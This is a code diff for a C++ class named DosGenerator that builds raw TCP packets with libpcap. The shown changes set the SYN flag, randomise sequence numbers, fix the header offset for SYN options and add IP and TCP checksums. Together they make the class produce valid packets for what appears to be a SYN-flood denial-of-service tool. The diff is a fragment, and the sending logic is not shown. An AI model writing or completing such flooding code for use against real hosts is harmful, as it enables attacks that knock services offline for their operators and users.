@@ -1,5 +1,6 @@
 #include "dosgenerator.h"
 #include "jpcap/printdata.h"
+#include "jpcap/calchecksum.h"
 
 pcap_t *DosGenerator::get_pcd() const
 {
@@ -67,11 +68,12 @@ bool DosGenerator::init_tcph(uint16_t src_port, uint16_t dest_port)
     memset(&tcph_,0,sizeof(struct tcphdr));
 
     //set tcp header
+    tcph_.syn = 1;
     tcph_.doff=5;
     tcph_.window=htons(1024);
     tcph_.source = htons(src_port);
     tcph_.dest = htons(dest_port);
-
+    tcph_.seq = rand() % UINT32_MAX;
     return true;
 
 }
@@ -91,8 +93,10 @@ void DosGenerator::switchPower()
 void DosGenerator::generate()
 {
 
-    iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
 
+
+    iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
+    tcph_.doff = (sizeof(struct tcphdr) + sizeof(SynOptions)) / 4;
     //make packet buf
     uint8_t packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions)];
 
@@ -118,6 +122,9 @@ void DosGenerator::generate()
     syn_options_.windowScale.length=3;
     syn_options_.windowScale.shifCount=7;
 
+    //calculate IP, TCP Checksum.
+    calIPChecksum((uint8_t*)&iph_);
+    calTCPChecksum((uint8_t*)&iph_,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
 
     //packet fill with ip, tcp, syn option
     memcpy(packet,&iph_,sizeof(struct iphdr));
